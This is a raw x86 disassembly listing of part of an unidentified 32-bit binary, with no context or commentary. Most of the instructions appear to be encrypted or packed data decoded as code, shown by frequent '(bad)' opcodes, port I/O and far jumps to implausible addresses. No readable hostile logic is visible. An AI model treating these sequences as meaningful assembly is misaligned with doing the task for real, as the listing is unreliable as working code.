  407b18:	mov    ?,WORD PTR [eax-0x61]
  407b1b:	xchg   ecx,eax
  407b1c:	inc    esp
  407b1d:	add    al,0xb2
  407b1f:	retf   0x29c0
  407b22:	mov    dl,0x53
  407b24:	push   ebx
  407b25:	jg     0x407b36
  407b27:	add    ebp,DWORD PTR [esi]
  407b29:	cmp    eax,0x7bf3e681
  407b2e:	xchg   ecx,eax
  407b2f:	ja     0x407af4
  407b31:	mov    ds:0x9cbbe359,eax
  407b36:	inc    edi
  407b37:	jb     0x407ad9
  407b39:	fidivr DWORD PTR fs:[ebp+0x42]
  407b3d:	xchg   esp,eax
  407b3e:	fild   WORD PTR [esi-0x6960bfe8]
  407b44:	rol    DWORD PTR [esi+0x71],1
  407b47:	sbb    eax,0x25315550
  407b4c:	push   ecx
  407b4d:	popa   
  407b4e:	nop
  407b4f:	and    BYTE PTR [edx+0x59cbc65a],0x96
  407b56:	cwde   
  407b57:	(bad)  
  407b58:	jmpw   0x4cfe
  407b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b5d:	adc    dl,cl
  407b5f:	push   ebx
  407b60:	sar    BYTE PTR [ecx],0x42
  407b63:	mov    esp,0xe248d7b9
  407b68:	(bad)  
  407b69:	jp     0x407b8f
  407b6b:	mov    al,ds:0x86ef775
  407b70:	ins    DWORD PTR es:[edi],dx
  407b71:	pop    ebp
  407b72:	push   edi
  407b73:	mov    cl,0x76
  407b75:	mov    esp,DWORD PTR ds:0x75e7086b
  407b7b:	pop    esi
  407b7c:	dec    edx
  407b7d:	jge    0x407b7f
  407b7f:	imul   eax,DWORD PTR [ecx],0xffffffa9
  407b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b83:	aaa    
  407b84:	cmp    esp,DWORD PTR [edi-0x2e]
  407b87:	data16 loope 0x407b0c
  407b8a:	xlat   BYTE PTR ds:[ebx]
  407b8b:	add    dl,BYTE PTR [ebp-0x7d0ec4d1]
  407b91:	sub    al,0x1d
  407b93:	pop    ecx
  407b94:	xor    al,0x30
  407b96:	add    ecx,DWORD PTR [ebx+0x29c1d20c]
  407b9c:	fwait
  407b9d:	mov    ch,0x3
  407b9f:	xchg   ecx,eax
  407ba0:	arpl   WORD PTR [ebx-0x71a40cff],dx
  407ba6:	inc    eax
  407ba7:	mov    bl,0x15
  407ba9:	in     al,0xa8
  407bab:	dec    esi
  407bac:	(bad)  
  407bad:	call   0xfa24:0xb5fe3590
  407bb4:	stc    
  407bb5:	cmp    eax,0x1d011f3a
  407bba:	inc    edi
  407bbb:	sbb    al,0xbb
  407bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bbe:	xchg   esp,eax
  407bbf:	loope  0x407b52
  407bc1:	mul    al
  407bc3:	(bad)  
  407bc4:	frstor [edi-0x3cde7258]
  407bca:	jp     0x407bbd
  407bcc:	repz and eax,0x3d51603b
  407bd2:	fdiv   QWORD PTR [ecx]
  407bd4:	inc    esi
  407bd5:	jmp    0x4c6c:0xfd470fe4
  407bdc:	xor    dh,BYTE PTR [edi+0x62]
  407bdf:	adc    ecx,DWORD PTR [ecx]
  407be1:	xor    ch,cl
  407be3:	outs   dx,DWORD PTR ds:[esi]
  407be4:	sbb    eax,0x4d1b1b32
  407be9:	mov    bh,0xdd
  407beb:	nop
  407bec:	mov    DWORD PTR [edx+0x7a],esi
  407bef:	sub    bh,BYTE PTR [ecx-0xf]
  407bf2:	(bad)  
  407bf3:	lea    edx,[esi]
  407bf5:	sbb    edi,ecx
  407bf7:	add    BYTE PTR [edx-0x4f45cbc8],0x78
  407bfe:	inc    esi
  407bff:	push   cs
  407c00:	pop    eax
  407c01:	jb     0x407c0b
  407c03:	jle    0x407c32
  407c05:	mul    BYTE PTR [esi]
  407c07:	sbb    DWORD PTR [esi],esp
  407c09:	out    dx,eax
  407c0a:	addr16 fwait
  407c0c:	imul   ebx,DWORD PTR [edi-0x310bdb6b],0xffffffe6
  407c13:	cwde   
  407c14:	inc    edx
  407c15:	iret   
  407c16:	mov    al,0x8a
  407c18:	sub    BYTE PTR [edx+0x1d],al
  407c1b:	out    0xf0,eax
  407c1d:	int    0xc6
  407c1f:	jnp    0x407ba2
  407c21:	or     al,0x7a
  407c23:	or     ecx,DWORD PTR [esp+esi*2]
  407c26:	jle    0x407bfc
  407c28:	std    
  407c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c2a:	xchg   edi,eax
  407c2b:	ins    BYTE PTR es:[edi],dx
  407c2c:	loope  0x407c06
  407c2e:	and    dh,BYTE PTR [ebp-0x10]
  407c31:	pop    ecx
  407c32:	jle    0x407bd1
  407c34:	inc    esp
  407c35:	call   0x77c3ce4f
  407c3a:	mov    al,ds:0x9a94c859
  407c3f:	xchg   edx,eax
  407c40:	sub    edi,eax
  407c42:	mov    dh,0x3e
  407c44:	inc    ebp
  407c45:	mov    bh,BYTE PTR [edi]
  407c47:	mov    bl,0x64
  407c49:	scas   eax,DWORD PTR es:[edi]
  407c4a:	retf   
  407c4b:	mov    ch,0x59
  407c4d:	lock sub al,0x5b
  407c50:	mov    dl,0x96
  407c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c53:	or     BYTE PTR [ebp-0x69],bh
  407c56:	push   ebx
  407c57:	mov    al,ds:0x745fbda9
  407c5c:	sub    ebx,edx
  407c5e:	icebp  
  407c5f:	outs   dx,BYTE PTR ds:[esi]
  407c60:	in     al,0xe0
  407c62:	mov    eax,ds:0x77507431
  407c67:	mov    al,0x8b
  407c69:	call   0x60fc74a4
  407c6e:	jb     0x407ce2
  407c70:	push   esi
  407c71:	mov    esi,DWORD PTR [ebx-0x78]
  407c74:	inc    ebp
  407c75:	push   esp
  407c76:	out    0xa1,al
  407c78:	sti    
  407c79:	push   es
  407c7a:	xchg   esi,eax
  407c7b:	fild   QWORD PTR [edi]
  407c7d:	pushf  
  407c7e:	jbe    0x407c2a
  407c80:	popa   
  407c81:	mov    esi,DWORD PTR [eax+0x29]
  407c84:	ret    0x2a2e
  407c87:	sub    DWORD PTR cs:[edi],edx
  407c8a:	retf   
  407c8b:	or     DWORD PTR [eax-0x54a51094],0xffffffc4
  407c92:	pop    eax
  407c93:	neg    DWORD PTR ds:0xc657db4
  407c99:	cmp    DWORD PTR [esi],0xa59806eb
  407c9f:	and    eax,0xde490d33
  407ca4:	int3   
  407ca5:	popa   
  407ca6:	(bad)  
  407ca7:	aad    0xdb
  407ca9:	dec    esi
  407caa:	rol    BYTE PTR [edx],cl
  407cac:	lods   eax,DWORD PTR ds:[esi]
  407cad:	test   DWORD PTR [esi],ebp
  407caf:	push   es
  407cb0:	(bad)  
  407cb1:	in     al,0xdd
  407cb3:	and    al,0xfb
  407cb5:	lods   al,BYTE PTR ds:[esi]
  407cb6:	aam    0xc3
  407cb8:	imul   ebp,DWORD PTR [edi],0x4f44d400
  407cbe:	dec    ebx
  407cbf:	rol    DWORD PTR [edi],0x2e
  407cc2:	push   0x54161f09
  407cc7:	push   ebp
  407cc8:	icebp  
  407cc9:	push   ecx
  407cca:	mov    BYTE PTR [ecx],dh
  407ccc:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407cce:	or     eax,0xa4d37277
  407cd3:	add    eax,DWORD PTR [ebx+ecx*2+0x61e1240f]
  407cda:	outs   dx,DWORD PTR ds:[esi]
  407cdb:	ret    0x6a3c
  407cde:	imul   edi,DWORD PTR [ebx-0x65],0xd55cadd9
  407ce5:	sub    eax,0xa42b970
  407cea:	add    eax,0x1cf4a9b
  407cef:	adc    bh,BYTE PTR [edx]
  407cf1:	inc    edx
  407cf2:	aas    
  407cf3:	sub    eax,0x655f09b4
  407cf8:	daa    
  407cf9:	in     al,0x31
  407cfb:	dec    esp
  407cfc:	iret   
  407cfd:	and    edx,ecx
  407cff:	lds    ebx,FWORD PTR [edi-0x2945659f]
  407d05:	das    
  407d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d07:	dec    esi
  407d08:	xchg   ecx,eax
  407d09:	xor    ah,BYTE PTR [ecx+0x79d41dc6]
  407d0f:	jmp    0xbc75183b
  407d14:	hlt    
  407d15:	int    0xa
  407d17:	ins    DWORD PTR es:[edi],dx
  407d18:	retf   0x29ba
  407d1b:	add    edx,esp
  407d1d:	pop    edi
  407d1e:	(bad)  
  407d1f:	or     DWORD PTR [ebp+0x69],ebx
  407d22:	jle    0x407d52
  407d24:	adc    DWORD PTR [eax],ecx
  407d26:	jle    0x407d42
  407d28:	cmp    BYTE PTR ds:0xdd04a021,al
  407d2e:	fidivr WORD PTR ds:0x89a1aaf9
  407d34:	push   ebp
  407d35:	cld    
  407d36:	mov    DWORD PTR [ebp-0x30],0xba699573
  407d3d:	sbb    DWORD PTR ds:0x422982,edx
  407d43:	mov    eax,0x9c0a89d8
  407d48:	or     edx,0x5666
  407d4e:	mov    DWORD PTR [ebp-0x2c],eax
  407d51:	sub    DWORD PTR ds:0x422996,ebx
  407d57:	mov    DWORD PTR [ebp-0x20],0xba699577
  407d5e:	and    DWORD PTR ds:0x42294a,ecx
  407d64:	mov    DWORD PTR [ebp-0x1c],eax
  407d67:	mov    DWORD PTR [ebp-0x10],0xba69957b
  407d6e:	mov    DWORD PTR [ebp-0xc],eax
  407d71:	mov    DWORD PTR [ebp-0x60],0xba69957f
  407d78:	add    edx,0x428b
  407d7e:	mov    DWORD PTR [ebp-0x5c],eax
  407d81:	sbb    DWORD PTR ds:0x42289a,0x1b7d
  407d8b:	mov    eax,DWORD PTR [ebp-0x30]
  407d8e:	xor    DWORD PTR ds:0x42299a,0x1f10
  407d98:	jmp    0x408322
  407d9d:	mov    ch,0x6c
  407d9f:	or     eax,0x997014f1
  407da4:	sbb    BYTE PTR [edx+0x46ecc17],bh
  407daa:	jl     0x407d8a
  407dac:	test   al,0x1c
  407dae:	popa   
  407daf:	push   ss
  407db0:	push   ss
  407db1:	cmp    eax,0x1161604
  407db6:	call   0xf374:0x671c15e4
  407dbd:	or     DWORD PTR [esi+0x65],edx
  407dc0:	leave  
  407dc1:	adc    al,0x64
  407dc3:	cdq    
  407dc4:	jnp    0x407dfa
  407dc6:	nop
  407dc7:	std    
  407dc8:	xchg   esp,eax
  407dc9:	inc    ebx
  407dca:	cmp    esp,edx
  407dcc:	aas    
  407dcd:	mov    bl,0x51
  407dcf:	inc    ebx
  407dd0:	mov    cl,0x4c
  407dd2:	jmp    0x7d2:0x36bb931d
  407dd9:	xor    esp,esp
  407ddb:	out    0x4a,al
  407ddd:	mov    ds:0xd03bfd78,eax
  407de2:	or     eax,0x80a1a666
  407de7:	sub    DWORD PTR [edx],edi
  407de9:	pop    ebx
  407dea:	jg     0x407ddb
  407dec:	popf   
  407ded:	pop    ebx
  407dee:	in     al,0x2d
  407df0:	jae    0x407dbc
  407df2:	add    DWORD PTR [edi+0x57],ecx
  407df5:	xchg   edi,eax
  407df6:	pushf  
  407df7:	xchg   esp,eax
  407df8:	les    ecx,FWORD PTR [edx-0x1c]
  407dfb:	cmp    BYTE PTR [eax-0x14],0x15
  407dff:	mov    ds:0xf2e4815b,eax
  407e04:	jns    0x407e25
  407e06:	jp     0x407e13
  407e08:	adc    BYTE PTR ds:0x659235c4,al
  407e0e:	aad    0xdf
  407e10:	stos   BYTE PTR es:[edi],al
  407e11:	mov    ebx,0x1374c86d
  407e16:	aad    0x8b
  407e18:	jno    0x407e89
  407e1a:	loopne 0x407e6c
  407e1c:	imul   ecx,DWORD PTR [edi],0x4ef414c0
  407e22:	push   es
  407e23:	mov    bh,0xde
  407e25:	test   DWORD PTR [edx+0x3e8297c3],0xfbf4710c
  407e2f:	js     0x407eae
  407e31:	xor    al,0x3f
  407e33:	in     al,dx
  407e34:	adc    al,0xe1
  407e36:	pop    esi
  407e37:	jp     0x407e59
  407e39:	outs   dx,BYTE PTR ds:[esi]
  407e3a:	adc    al,bh
  407e3c:	shl    BYTE PTR [ecx],cl
  407e3e:	jg     0x407e13
  407e40:	sbb    bl,BYTE PTR [eax]
  407e42:	dec    edx
  407e43:	mov    DWORD PTR [esi],0xf40a3afc
  407e49:	shr    DWORD PTR [edx+eiz*1],0x2b
  407e4d:	xor    al,0xd1
  407e4f:	push   eax
  407e50:	aas    
  407e51:	xlat   BYTE PTR ds:[ebx]
  407e52:	enter  0xf3f3,0x9
  407e56:	out    dx,eax
  407e57:	loope  0x407e45
  407e59:	nop
  407e5a:	cmc    
  407e5b:	adc    edx,esp
  407e5d:	adc    ebp,DWORD PTR [edx-0x240c698]
  407e63:	ss fsubrp st(7),st
  407e66:	retf   
  407e67:	leave  
  407e68:	jle    0x407ebb
  407e6a:	js     0x407e5e
  407e6c:	bound  esi,QWORD PTR [edi+0x35]
  407e6f:	xor    DWORD PTR [eax-0x5aa4c0f6],esp
  407e75:	repz mov ebx,0xa2517ace
  407e7b:	in     eax,dx
  407e7c:	mov    eax,0x698a4e4a
  407e81:	jns    0x407e4b
  407e83:	or     eax,0x8e9f3a
  407e88:	imul   edi,DWORD PTR [edi],0x5410d80d
  407e8e:	fwait
  407e8f:	jl     0x407e93
  407e91:	fwait
  407e92:	(bad)  
  407e93:	adc    al,0x2c
  407e95:	xor    BYTE PTR [ecx],0xd5
  407e98:	data16 mov BYTE PTR ds:0x5a0932f3,ah
  407e9f:	cli    
  407ea0:	ret    0xd206
  407ea3:	fcom   DWORD PTR [ebp+0x29]
  407ea6:	jg     0x407e72
  407ea8:	jae    0x407e6e
  407eaa:	xlat   BYTE PTR ds:[ebx]
  407eab:	adc    DWORD PTR [ebx+0x4cd6b02e],edx
  407eb1:	sti    
  407eb2:	out    0x41,eax
  407eb4:	xchg   esi,eax
  407eb5:	aas    
  407eb6:	xchg   DWORD PTR [ebx+0x5232d56a],eax
  407ebc:	pop    ecx
  407ebd:	xor    DWORD PTR [eax],ebx
  407ebf:	inc    edx
  407ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ec1:	in     al,0xce
  407ec3:	push   0x9d7d173f
  407ec8:	add    ah,BYTE PTR [ecx+0x7c305f71]
  407ece:	ds mov ebp,0x68a19f7c
  407ed4:	data16 sub ah,bh
  407ed7:	dec    edi
  407ed8:	sub    eax,0x747c2d9c
  407edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ede:	pop    eax
  407edf:	cwde   
  407ee0:	jl     0x407eaf
  407ee2:	(bad)  
  407ee3:	xchg   ecx,eax
  407ee4:	dec    eax
  407ee5:	mov    dh,0xc9
  407ee7:	rcl    bl,1
  407ee9:	shl    ebx,0x5b
  407eec:	call   0x2d4e:0x789a9448
  407ef3:	dec    ebp
  407ef4:	jnp    0x407f5a
  407ef6:	test   BYTE PTR [edi],al
  407ef8:	jne    0x407f42
  407efa:	adc    esi,ebp
  407efc:	and    DWORD PTR [edi],edx
  407efe:	ret    
  407eff:	xchg   ebp,eax
  407f00:	cmp    al,BYTE PTR [eax-0x2e]
  407f03:	and    bl,BYTE PTR [ebp-0xb51b55f]
  407f09:	fadd   QWORD PTR [edx]
  407f0b:	xor    al,0xaf
  407f0d:	int3   
  407f0e:	stc    
  407f0f:	iret   
  407f10:	lock iret 
  407f12:	jne    0x407f37
  407f14:	fbstp  TBYTE PTR [ebx+0x133982e5]
  407f1a:	loopne 0x407f0b
  407f1c:	adc    al,0x7e
  407f1e:	scas   al,BYTE PTR es:[edi]
  407f1f:	pop    ebp
  407f20:	es sbb eax,0x6ccfa5c2
  407f26:	dec    esp
  407f27:	fdivr  QWORD PTR [edx]
  407f29:	cmp    ebx,DWORD PTR [edi]
  407f2b:	mov    edx,0xfc7475ea
  407f30:	ds sbb dh,dh
  407f33:	push   edx
  407f34:	icebp  
  407f35:	shl    DWORD PTR [edi],0xc9
  407f38:	xor    al,0xb6
  407f3a:	mov    esp,0xca93ce04
  407f3f:	xchg   esp,eax
  407f40:	and    DWORD PTR [esi],esp
  407f42:	jg     0x407f47
  407f44:	pop    esi
  407f45:	ins    DWORD PTR es:[edi],dx
  407f46:	push   edx
  407f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f48:	in     eax,0x97
  407f4a:	mov    al,0x66
  407f4c:	in     al,0xf
  407f4e:	imul   esp,DWORD PTR [edi+esi*2],0xfef49914
  407f55:	sub    esp,DWORD PTR [eax]
  407f57:	je     0x407f53
  407f59:	dec    esi
  407f5a:	mov    bh,BYTE PTR [edi+0x14457496]
  407f60:	mov    esp,esi
  407f62:	xchg   DWORD PTR [eax],esi
  407f64:	(bad)  [eax]
  407f66:	out    0xab,al
  407f68:	ds push 0xec6701e5
  407f6e:	pusha  
  407f6f:	nop
  407f70:	mov    bh,0x57
  407f72:	ja     0x407f71
  407f74:	xchg   edi,eax
  407f75:	jae    0x407fb1
  407f77:	stos   BYTE PTR es:[edi],al
  407f78:	fwait
  407f79:	mov    ecx,0x975c3dc3
  407f7e:	jbe    0x407f80
  407f80:	xchg   ecx,eax
  407f81:	pushw  0x42aa
  407f85:	adc    cl,BYTE PTR [ebp+ebp*8+0x7cc432af]
  407f8c:	jl     0x407fe7
  407f8e:	adc    bh,BYTE PTR [ebx+0x56bb23ea]
  407f94:	xchg   edi,eax
  407f95:	neg    DWORD PTR [esi-0x5b]
  407f98:	cmc    
  407f99:	scas   al,BYTE PTR es:[edi]
  407f9a:	aaa    
  407f9b:	fwait
  407f9c:	fwait
  407f9d:	mov    al,BYTE PTR [esi-0x7a]
  407fa0:	hlt    
  407fa1:	add    ecx,ecx
  407fa3:	out    dx,eax
  407fa4:	xor    al,0x95
  407fa6:	in     eax,dx
  407fa7:	lahf   
  407fa8:	cmp    ebp,DWORD PTR [eax-0x28]
  407fab:	or     edx,ebp
  407fad:	add    eax,0x1a1a23ab
  407fb2:	mov    DWORD PTR [edx-0x42],0xefb5e0d6
  407fb9:	sbb    ch,BYTE PTR ds:0xb705038e
  407fbf:	scas   al,BYTE PTR es:[edi]
  407fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fc1:	out    dx,eax
  407fc2:	jp     0x407fb7
  407fc4:	sub    eax,0x90a6c86f
  407fc9:	test   eax,0xfa6b3e13
  407fce:	ds out 0xb8,al
  407fd1:	popf   
  407fd2:	mov    WORD PTR [ebp+0x3bf79e78],?
  407fd8:	xchg   ebx,eax
  407fd9:	loop   0x407f8d
  407fdb:	arpl   ax,si
  407fdd:	popf   
  407fde:	(bad)  
  407fdf:	lods   eax,DWORD PTR ds:[esi]
  407fe0:	out    dx,eax
  407fe1:	sti    
  407fe2:	xchg   esp,eax
  407fe3:	in     eax,0xfe
  407fe5:	and    ecx,ebx
  407fe7:	into   
  407fe8:	jle    0x407f93
  407fea:	inc    esi
  407feb:	xchg   DWORD PTR es:[ebp+0x29],esp
  407fef:	xor    al,0x7d
  407ff1:	aam    0xfc
  407ff3:	xor    eax,0x8ec3139d
  407ff8:	lods   al,BYTE PTR ds:[esi]
  407ff9:	xor    eax,0xeb99615d
  407ffe:	mov    ds:0x3fd56e3c,eax
  408003:	shr    BYTE PTR [esp+ecx*8-0x57f878d3],0x66
  40800b:	mov    edi,0xe5b13688
  408010:	es mov esp,0x1f64cb39
  408016:	or     DWORD PTR [ebp+eiz*2-0x2a],esp
  40801a:	jp     0x40805b
  40801c:	pop    esp
  40801d:	and    ebx,esi
  40801f:	and    bh,al
  408021:	shr    al,1
  408023:	add    al,0x96
  408025:	sar    DWORD PTR [edx+0x91ea9ac],0x4b
  40802c:	addr16 loopne 0x407ff5
  40802f:	retf   0x244a
  408032:	xor    eax,0xdeb62b30
  408037:	mov    DWORD PTR ds:0x51f1068e,ebx
  40803d:	push   eax
  40803e:	mov    ah,0x40
  408040:	enter  0x6e5e,0x57
  408044:	xchg   ebp,eax
  408045:	and    DWORD PTR [esi+eiz*4+0x69fcd8df],0x32
  40804d:	xor    eax,0x64030bb3
  408052:	mov    ch,0xe5
  408054:	adc    al,bl
  408056:	lds    ecx,FWORD PTR [ebx-0x34]
  408059:	mov    DWORD PTR [eax+0x1b],ebp
  40805c:	fidivr DWORD PTR [esi+0x1]
  40805f:	mov    ebx,esp
  408061:	pop    edx
  408062:	call   0x4e1abfda
  408067:	jbe    0x408061
  408069:	mov    ebx,DWORD PTR [ebx-0x6]
  40806c:	mov    ch,0x94
  40806e:	stos   DWORD PTR es:[edi],eax
  40806f:	ins    DWORD PTR es:[edi],dx
  408070:	xor    bl,BYTE PTR [edi+0x4a35fcd1]
  408076:	cdq    
  408077:	sti    
  408078:	xchg   ebx,ecx
  40807a:	daa    
  40807b:	and    ebp,DWORD PTR [esi+eiz*1]
  40807e:	ficomp DWORD PTR [ebx+0x64]
  408081:	in     al,dx
  408082:	rcl    al,1
  408084:	sbb    DWORD PTR [esi-0x42bdea28],0xffffffff
  40808b:	mov    dl,0x32
  40808d:	(bad)  
  40808e:	iret   
  40808f:	out    dx,al
  408090:	out    dx,al
  408091:	sub    ebp,DWORD PTR [edx+0x1d]
  408094:	cmp    edi,DWORD PTR [eax-0x2e09eca9]
  40809a:	mov    edi,0x41b62cc6
  40809f:	and    bh,al
  4080a1:	bound  edi,QWORD PTR ds:0xd16ada77
  4080a7:	xchg   ebx,eax
  4080a8:	std    
  4080a9:	call   0x2889:0xf727a362
  4080b0:	icebp  
  4080b1:	push   0x4126403c
  4080b6:	pusha  
  4080b7:	mov    edi,0x6a1e5610
  4080bc:	mov    ebp,0x7faff266
  4080c1:	(bad)  
  4080c2:	mov    esi,0xceea58aa
  4080c7:	movzx  esp,bp
  4080ca:	or     al,0x1e
  4080cc:	pusha  
  4080cd:	xchg   ecx,eax
  4080ce:	pop    es
  4080cf:	xor    BYTE PTR [ecx-0x1e38c077],0x2c
  4080d6:	jmp    0x408100
  4080d8:	cmp    BYTE PTR [ecx-0x52894ef4],al
  4080de:	sub    bh,al
  4080e0:	fwait
  4080e1:	jge    0x4080a5
  4080e3:	dec    edx
  4080e4:	clc    
  4080e5:	aas    
  4080e6:	sbb    al,0xff
  4080e8:	test   BYTE PTR [ebp+0x494a0ba],dl
  4080ee:	fwait
  4080ef:	ror    bl,cl
  4080f1:	sub    DWORD PTR ds:0xfce8b05f,ebp
  4080f7:	aas    
  4080f8:	retf   0xac1f
  4080fb:	sbb    esi,DWORD PTR [ebp+0x3b]
  4080fe:	repnz or DWORD PTR [eax+0x45],0x62
  408103:	dec    ecx
  408104:	aaa    
  408105:	imul   eax,DWORD PTR [eax],0xffffffa6
  408108:	jl     0x4080ae
  40810a:	fistp  WORD PTR [edi+0x38]
  40810d:	pushf  
  40810e:	sbb    edi,DWORD PTR [edx-0x4e2a9552]
  408114:	stc    
  408115:	out    dx,eax
  408116:	jno    0x40816c
  408118:	hlt    
  408119:	ret    0x1e05
  40811c:	sbb    BYTE PTR [esi+0x792bd410],ah
  408122:	xor    ah,BYTE PTR [edi-0x3f]
  408125:	outs   dx,BYTE PTR ds:[esi]
  408126:	inc    ebp
  408127:	test   ebx,eax
  408129:	into   
  40812a:	pop    ebp
  40812b:	add    eax,0x26f84a77
  408130:	add    eax,0x9a0e8daa
  408135:	and    bl,BYTE PTR ss:[ecx+0x1cb265f8]
  40813c:	mov    bl,0x2c
  40813e:	outs   dx,DWORD PTR ds:[esi]
  40813f:	(bad)  
  408140:	inc    edx
  408141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408142:	lahf   
  408143:	jae    0x408170
  408145:	or     eax,0x131d9652
  40814a:	rcl    BYTE PTR [ebp+0x1dc80abc],1
  408150:	in     eax,dx
  408151:	xchg   ah,ah
  408153:	jmp    0x40816c
  408155:	in     eax,0x81
  408157:	popf   
  408158:	push   edx
  408159:	enter  0xc927,0x1a
  40815d:	xchg   esi,eax
  40815e:	mov    cl,0x97
  408160:	pop    ss
  408161:	mov    ecx,0xb52deb9c
  408166:	pop    edx
  408167:	outs   dx,BYTE PTR ds:[esi]
  408168:	cmp    ah,BYTE PTR [edi]
  40816a:	jl     0x4081dc
  40816c:	in     eax,dx
  40816d:	mov    ds:0x231878c1,eax
  408172:	mov    edx,0xdff10187
  408177:	lock mov WORD PTR [ecx-0x2b3ec91],?
  40817e:	imul   edx,DWORD PTR [ebp-0x58271abc],0xffffff9b
  408185:	in     al,dx
  408186:	(bad)  
  408187:	in     eax,0x25
  408189:	fld    DWORD PTR [ecx-0x59]
  40818c:	cmp    ecx,DWORD PTR [esi-0x11]
  40818f:	retf   0x8344
  408192:	aas    
  408193:	retf   
  408194:	adc    bl,dh
  408196:	gs cli 
  408198:	add    DWORD PTR [ecx-0x61],esi
  40819b:	or     esp,ebp
  40819d:	mov    esp,0x8300d22c
  4081a2:	and    bh,bh
  4081a4:	xchg   edx,eax
  4081a5:	outs   dx,BYTE PTR ds:[esi]
  4081a6:	dec    esi
  4081a7:	lods   eax,DWORD PTR ds:[esi]
  4081a8:	jne    0x40818f
  4081aa:	fistp  DWORD PTR [ebx+0x25]
  4081ad:	lods   eax,DWORD PTR ds:[esi]
  4081ae:	inc    eax
  4081af:	(bad)  
  4081b0:	push   ebp
  4081b1:	into   
  4081b2:	ret    
  4081b3:	dec    edx
  4081b4:	outs   dx,BYTE PTR ds:[esi]
  4081b5:	jg     0x4081a4
  4081b7:	or     ebp,DWORD PTR [esp+ecx*8-0x6ca5f118]
  4081be:	ds into 
  4081c0:	pop    edi
  4081c1:	nop
  4081c2:	mov    ebp,0xaff5ea09
  4081c7:	xlat   BYTE PTR ds:[ebx]
  4081c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c9:	or     ch,BYTE PTR [eax-0x4d02680f]
  4081cf:	jmp    0x2092:0x47ed8e2e
  4081d6:	mov    ebp,0xb3c0d409
  4081db:	cmp    ch,cl
  4081dd:	push   esp
  4081de:	shr    ebp,0x4e
  4081e1:	jmp    0x40820b
  4081e3:	pop    esp
  4081e4:	shl    BYTE PTR [ebp-0x23],1
  4081e7:	das    
  4081e8:	in     al,0x5d
  4081ea:	test   al,0x45
  4081ec:	arpl   WORD PTR [edi-0x10],di
  4081ef:	out    0x5e,eax
  4081f1:	pop    edi
  4081f2:	shl    DWORD PTR [edx+0x3813de6b],0xf4
  4081f9:	mov    ch,0x90
  4081fb:	adc    BYTE PTR [ebx],ah
  4081fd:	mov    ebx,0x23c374fe
  408202:	call   0x2fc93b63
  408207:	shr    DWORD PTR [ecx+edi*4+0x10],1
  40820b:	scas   al,BYTE PTR es:[edi]
  40820c:	or     eax,DWORD PTR [edx-0xf064ad6]
  408212:	inc    ecx
  408213:	mov    dh,0xdb
  408215:	xor    eax,0xc7cca422
  40821a:	dec    esp
  40821b:	add    ebx,DWORD PTR [eax]
  40821d:	push   esp
  40821e:	hlt    
  40821f:	push   ecx
  408220:	test   BYTE PTR [edi-0x65],bl
  408223:	xlat   BYTE PTR ds:[ebx]
  408224:	fisubr WORD PTR [ebx+esi*8]
  408227:	int3   
  408228:	int3   
  408229:	push   eax
  40822a:	cs loopne 0x40828e
  40822d:	mov    dl,0x9f
  40822f:	xchg   esp,eax
  408230:	jnp    0x408214
  408232:	adc    al,0xc6
  408234:	cwde   
  408235:	call   0xe52f:0xae265b22
  40823c:	inc    edi
  40823d:	cs not edx
  408240:	sbb    ah,BYTE PTR [ecx-0x36]
  408243:	add    ch,BYTE PTR [edx-0x1f]
  408246:	add    ch,BYTE PTR [ecx]
  408248:	lods   al,BYTE PTR ds:[esi]
  408249:	adc    eax,0x4a7b7c84
  40824e:	sbb    esi,ebp
  408250:	adc    BYTE PTR [edx+0x47],cl
  408253:	mov    bh,0xb7
  408255:	adc    al,BYTE PTR [edx+0x49aa0f2d]
  40825b:	nop
  40825c:	div    DWORD PTR [ebx+0x6811a21c]
  408262:	jnp    0x40820f
  408264:	rcr    ecx,0x88
  408267:	pop    ss
  408268:	add    BYTE PTR [esi-0x7d],0x30
  40826c:	or     al,0xd2
  40826e:	mov    BYTE PTR [ebx],bh
  408270:	mov    dh,0x82
  408272:	mov    WORD PTR [ecx],ds
  408274:	aam    0x26
  408276:	mov    al,ds:0x23c67a20
  40827b:	sub    edx,DWORD PTR [ebp+0x1c]
  40827e:	(bad)  
  40827f:	mov    ebp,0x8232bd51
  408284:	cs cmp eax,0xf380b7e5
  40828a:	add    al,0x6e
  40828c:	jb     0x40821b
  40828e:	fiadd  DWORD PTR [edi]
  408290:	and    BYTE PTR [ebx-0x57],ah
  408293:	mov    dl,0x8f
  408295:	retf   0x5287
  408298:	inc    edx
  408299:	pop    esi
  40829a:	dec    ecx
  40829b:	pushf  
  40829c:	test   BYTE PTR [esi+ebp*1+0x6411d15b],ch
  4082a3:	ins    BYTE PTR es:[edi],dx
  4082a4:	cmp    eax,0xd9e8bdae
  4082a9:	xor    al,0x3a
  4082ab:	adc    DWORD PTR [ebp+0x7b],ebp
  4082ae:	pusha  
  4082af:	pop    edx
  4082b0:	and    BYTE PTR [esi+0x34],dl
  4082b3:	cmp    DWORD PTR [esi-0x22],esp
  4082b6:	mov    gs,WORD PTR [esi+0x10]
  4082b9:	or     eax,0x3700337d
  4082be:	outs   dx,BYTE PTR ds:[esi]
  4082bf:	push   0x44
  4082c1:	xchg   edi,eax
  4082c2:	pusha  
  4082c3:	inc    edi
  4082c4:	cmc    
  4082c5:	ret    
  4082c6:	sbb    DWORD PTR [ecx-0x33],0xfffffff5
  4082ca:	loopne 0x4082e5
  4082cc:	fisttp DWORD PTR [edi]
  4082ce:	jbe    0x408300
  4082d0:	sbb    ebx,esp
  4082d2:	sbb    DWORD PTR [edx],ebx
  4082d4:	repz adc edi,DWORD PTR [esi]
  4082d7:	sti    
  4082d8:	adc    BYTE PTR [ebx+0x716473d1],0x3
  4082df:	mov    bh,0x6a
  4082e1:	cs lock out 0x5b,al
